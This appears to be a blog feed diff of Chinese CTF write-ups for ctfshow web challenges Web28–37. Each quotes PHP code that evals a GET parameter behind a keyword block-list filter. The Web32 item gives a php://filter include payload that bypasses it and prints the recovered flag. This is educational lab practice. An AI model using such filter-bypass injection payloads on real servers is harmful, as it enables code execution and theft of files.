+							&amp;lt;input id=&amp;#34;p&amp;#34; name=&amp;#34;password&amp;#34; type=&amp;#34;password&amp;#34; id=&amp;#34;Textbox1&amp;#34; tabindex=&amp;#34;2&amp;#34; class=&amp;#34;text_nor&amp;#34; autocomplete=&amp;#34;off&amp;#34; /&amp;gt;&amp;lt;input name=&amp;#34;TextBox2&amp;#34; type=&amp;#34;password&amp;#34; id=&amp;#34;TextBox2&amp;#34; tabindex=&amp;#34;2&amp;#34; class=&amp;#34;text_nor&amp;#34; onblur=&amp;#34;update(this);&amp;#34; autocomplete=&amp;#34;off&amp;#34; style=&amp;#34;DISPLAY: none&amp;#34; /&amp;gt;&amp;lt;/dd&amp;gt;&amp;lt;/dl&amp;gt;
+					&amp;lt;div style=&amp;#34;CLEAR: both&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;
+					&amp;lt;div style=&amp;#34;CLEAR: both&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;
+					&amp;lt;dl&amp;gt;
+						&amp;lt;dd&amp;gt;
+							&amp;lt;table id=&amp;#34;RadioButtonList1&amp;#34; border=&amp;#34;0&amp;#34;&amp;gt;
+	&amp;lt;tr&amp;gt;
+		&amp;lt;td&amp;gt;&amp;lt;input id=&amp;#34;RadioButtonList1_0&amp;#34; type=&amp;#34;radio&amp;#34; name=&amp;#34;RadioButtonList1&amp;#34; value=&amp;#34;部门&amp;#34; tabindex=&amp;#34;4&amp;#34; /&amp;gt;&amp;lt;label for=&amp;#34;RadioButtonList1_0&amp;#34;&amp;gt;部门&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input id=&amp;#34;RadioButtonList1_1&amp;#34; type=&amp;#34;radio&amp;#34; name=&amp;#34;RadioButtonList1&amp;#34; value=&amp;#34;教师&amp;#34; tabindex=&amp;#34;4&amp;#34; /&amp;gt;&amp;lt;label for=&amp;#34;RadioButtonList1_1&amp;#34;&amp;gt;教师&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input id=&amp;#34;RadioButtonList1_2&amp;#34; type=&amp;#34;radio&amp;#34; name=&amp;#34;RadioButtonList1&amp;#34; value=&amp;#34;学生&amp;#34; checked=&amp;#34;checked&amp;#34; tabindex=&amp;#34;4&amp;#34; /&amp;gt;&amp;lt;label for=&amp;#34;RadioButtonList1_2&amp;#34;&amp;gt;学生&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;&amp;lt;td&amp;gt;&amp;lt;input id=&amp;#34;RadioButtonList1_3&amp;#34; type=&amp;#34;radio&amp;#34; name=&amp;#34;RadioButtonList1&amp;#34; value=&amp;#34;访客&amp;#34; tabindex=&amp;#34;4&amp;#34; /&amp;gt;&amp;lt;label for=&amp;#34;RadioButtonList1_3&amp;#34;&amp;gt;访客&amp;lt;/label&amp;gt;&amp;lt;/td&amp;gt;
+	&amp;lt;/tr&amp;gt;
+&amp;lt;/table&amp;gt;&amp;lt;/dd&amp;gt;
+						&amp;lt;dt&amp;gt;&amp;lt;/dt&amp;gt;
+					&amp;lt;/dl&amp;gt;
+					&amp;lt;div style=&amp;#34;CLEAR: both&amp;#34;&amp;gt;&amp;lt;/div&amp;gt;
+					&amp;lt;dl&amp;gt;
+						&amp;lt;dd&amp;gt;
+							&amp;lt;input type=&amp;#34;button&amp;#34; onclick=&amp;#34;check();&amp;#34; name=&amp;#34;Button1&amp;#34; value=&amp;#34;&amp;#34; id=&amp;#34;Button1&amp;#34; class=&amp;#34;btn_dl&amp;#34; /&amp;gt;&amp;lt;input type=&amp;#34;submit&amp;#34; name=&amp;#34;Button2&amp;#34; value=&amp;#34;&amp;#34; id=&amp;#34;Button2&amp;#34; class=&amp;#34;btn_cz&amp;#34; /&amp;gt;&amp;lt;input name=&amp;#34;lbLanguage&amp;#34; type=&amp;#34;text&amp;#34; id=&amp;#34;lbLanguage&amp;#34; style=&amp;#34;DISPLAY: none&amp;#34; /&amp;gt;
+								
+							&amp;lt;p&amp;gt;&amp;lt;a href=&amp;#34;list.xlsx&amp;#34; id=&amp;#34;linkForget&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;录取名单&amp;lt;/a&amp;gt;&amp;lt;br&amp;gt;
+								&amp;lt;A  href=&amp;#34;info/query.php&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;
+									&amp;lt;span id=&amp;#34;lbSelect&amp;#34;&amp;gt;学生学籍信息查询系统&amp;lt;/span&amp;gt;&amp;lt;/A&amp;gt;&amp;lt;/p&amp;gt;
+						&amp;lt;/dd&amp;gt;
+					&amp;lt;/dl&amp;gt;
+				&amp;lt;/div&amp;gt;
+				&amp;lt;div class=&amp;#34;login_copyright&amp;#34;&amp;gt;&amp;lt;IMG src=&amp;#34;logo/二维码.png&amp;#34;&amp;gt;&amp;lt;span&amp;gt;&amp;amp;copy;1999-2017 &amp;lt;a href=&amp;#34;http://www.zfsoft.com&amp;#34; target=&amp;#34;_blank&amp;#34;&amp;gt;正方软件股份有限公司&amp;lt;/a&amp;gt; &amp;lt;span&amp;gt;版权所有&amp;lt;/span&amp;gt;&amp;lt;/span&amp;gt;
+					&amp;lt;input name=&amp;#34;hidPdrs&amp;#34; id=&amp;#34;hidPdrs&amp;#34; type=&amp;#34;hidden&amp;#34; size=&amp;#34;5&amp;#34; /&amp;gt;&amp;lt;input name=&amp;#34;hidsc&amp;#34; id=&amp;#34;hidsc&amp;#34; type=&amp;#34;hidden&amp;#34; size=&amp;#34;5&amp;#34; /&amp;gt;
+				&amp;lt;/div&amp;gt;
+			&amp;lt;/div&amp;gt;
+		&amp;lt;/form&amp;gt;
+	&amp;lt;/body&amp;gt;
+		&amp;lt;script type=&amp;#34;text/javascript&amp;#34; src=&amp;#34;js/jquery.min.js&amp;#34;&amp;gt;&amp;lt;/script&amp;gt;
+
+	&amp;lt;script&amp;gt;
+
+		function check(){
+			$.ajax({
+			url:&amp;#39;checklogin.php&amp;#39;,
+			type: &amp;#39;POST&amp;#39;,
+			dataType:&amp;#39;json&amp;#39;,
+			data:{
+				&amp;#39;a&amp;#39;:$(&amp;#39;#a&amp;#39;).val(),
+				&amp;#39;p&amp;#39;:$(&amp;#39;#p&amp;#39;).val()
+			},
+			success:function(data){
+				alert(data[&amp;#39;msg&amp;#39;]);
+			},
+			error:function(data){
+				alert(data[&amp;#39;msg&amp;#39;]);
+			}
+
+		});
+		}
+
+
+	&amp;lt;/script&amp;gt;
+&amp;lt;/HTML&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;审查源码可获得一份list.xlsx文件，内容为&lt;/strong&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web28</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web28/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E7%88%86%E7%A0%B4/web28/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303133032279&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303133032279.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;链接靶场，查看源码，未发现利用点&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303133145968&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303133145968.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;观察目录，发现目录多以序号命名，尝试使用&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5Cdirsearch%E4%BD%BF%E7%94%A8%E6%89%8B%E5%86%8C.md&#34;&gt;dirsearch&lt;/a&gt;后台扫描爆破&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web29</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web29/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303152046331&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303152046331.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，靶场回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:26:48
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计。preg_match过滤掉所有传参值中含/flag/i的形式，并输出执行$c的结果。可以猜测出flag与目录/flag/i有关，传入参数&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303152723982&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303152723982.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;构造形式绕过preg_match访问flag.php,获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303153453255&#34; loading=&#34;lazy&#34; src=&#34;./assets/image-20250303153453255.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web30</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web30/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303210820130&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303210820130.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，回显源码&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:42:26
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;源码审计发现，传入的参数C被过滤掉flag、system、php、i字段&lt;/p&gt;
+&lt;p&gt;尝试构造绕过&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303212731388&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303212731388.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x03&#34;&gt;0x03&lt;/h3&gt;
+&lt;p&gt;发现同目录下有flag.php文件，构造语句打开，获得flag&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250303212829558&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303212829558.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web31</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web31/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303213650078&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303213650078.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:49:10
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后处理方法同30&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web32</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web32/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303214443885&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303214443885.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 00:56:31
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后处理方法同30&lt;/p&gt;
+&lt;p&gt;区别为由于过滤&lt;code&gt;()&lt;/code&gt;和空格,需要调用不使用&lt;code&gt;()&lt;/code&gt;的函数，例如：&lt;code&gt;print、echo、die;、include “”、require “”、include_once “”、require_once “”&lt;/code&gt; 等。&lt;/p&gt;
+&lt;p&gt;这里采用include，由于&lt;code&gt;include &amp;quot;&amp;quot;&lt;/code&gt;为包含而非执行,故a参数使用sys等传入C中再执行过滤检查依然无法通过，因此a的参数需要使用伪协议进行编码后输出。&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CPHP_%E4%BC%AA%E5%8D%8F%E8%AE%AE.md&#34;&gt;php伪协议细节相关&lt;/a&gt;。&lt;/p&gt;
+&lt;p&gt;综上，构造payload如下&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?c=include&amp;#34;$_GET[a]&amp;#34;?&amp;gt;&amp;amp;a=php://filter/read=convert.base64-encode/resource=flag.php
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;或&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;?c=include&amp;#34;$_POST[a]&amp;#34;?&amp;gt;&amp;amp;a=本地构造的文件路径
+#本地文件以post附件的形式提交
+&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;提交payload，由于&lt;code&gt;read=convert.base64-encode&lt;/code&gt;以base64编码形式输出php流，base64解码后获得flag&lt;code&gt;$flag=&amp;quot;ctfshow(da2e0b07-ccca-4409-9552-9aa3e55014ee)&amp;quot;;&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250304141622560&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304141622560.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img alt=&#34;image-20250310183927279&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310183927279.png&#34;&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web33</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web33/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web33/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250303221054952&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250303221054952.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 02:22:27
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+//
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(|\&amp;#34;/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后处理方法同30&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CPHP_%E4%BC%AA%E5%8D%8F%E8%AE%AE.md&#34;&gt;php伪协议细节相关&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web34</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web34/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web34/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250304141854317&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304141854317.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 04:21:29
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(|\:|\&amp;#34;/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后方法同33&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CPHP_%E4%BC%AA%E5%8D%8F%E8%AE%AE.md&#34;&gt;php伪协议细节相关&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web35</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web35/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web35/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250310184754718&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250310184754718.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 04:21:23
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(|\:|\&amp;#34;|\&amp;lt;|\=/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后同34&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CPHP_%E4%BC%AA%E5%8D%8F%E8%AE%AE.md&#34;&gt;php伪协议细节相关&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web36</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web36/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web36/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250304145409279&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304145409279.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 04:21:16
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag|system|php|cat|sort|shell|\.| |\&amp;#39;|\`|echo|\;|\(|\:|\&amp;#34;|\&amp;lt;|\=|\/|[0-9]/i&amp;#34;, $c)){
+        eval($c);
+    }
+    
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
+&lt;p&gt;代码审计后同35&lt;/p&gt;
+&lt;p&gt;&lt;a href=&#34;D:%5Cmarkdown_note%5Cweb%E6%B8%97%E9%80%8F%E7%BB%8F%E9%AA%8C%E6%80%BB%E7%BB%93%E6%89%8B%E5%86%8C%5CPHP_%E4%BC%AA%E5%8D%8F%E8%AE%AE.md&#34;&gt;php伪协议细节相关&lt;/a&gt;&lt;/p&gt;</description>
+    </item>
+    <item>
+      <title>Web37</title>
+      <link>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/</link>
+      <pubDate>Mon, 10 Mar 2025 00:00:00 +0000</pubDate>
+      <guid>http://localhost:1313/posts/auran_lu/ctfshow/web%E5%85%A5%E9%97%A8/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web37/</guid>
+      <description>&lt;p&gt;&lt;img alt=&#34;image-20250304151543883&#34; loading=&#34;lazy&#34; src=&#34;https://raw.githubusercontent.com/Auran-Lu/Blog_img/main/image-20250304151543883.png&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;0x01&#34;&gt;0x01&lt;/h3&gt;
+&lt;p&gt;访问靶场，获得源码回显&lt;/p&gt;
+&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-php+HTML&#34; data-lang=&#34;php+HTML&#34;&gt;&amp;lt;?php
+
+/*
+# -*- coding: utf-8 -*-
+# @Author: h1xa
+# @Date:   2020-09-04 00:12:34
+# @Last Modified by:   h1xa
+# @Last Modified time: 2020-09-04 05:18:55
+# @email: h1xa@ctfer.com
+# @link: https://ctfer.com
+*/
+
+//flag in flag.php
+error_reporting(0);
+if(isset($_GET[&amp;#39;c&amp;#39;])){
+    $c = $_GET[&amp;#39;c&amp;#39;];
+    if(!preg_match(&amp;#34;/flag/i&amp;#34;, $c)){
+        include($c);
+        echo $flag;
+    
+    }
+        
+}else{
+    highlight_file(__FILE__);
+}
+&lt;/code&gt;&lt;/pre&gt;&lt;h3 id=&#34;0x02&#34;&gt;0x02&lt;/h3&gt;
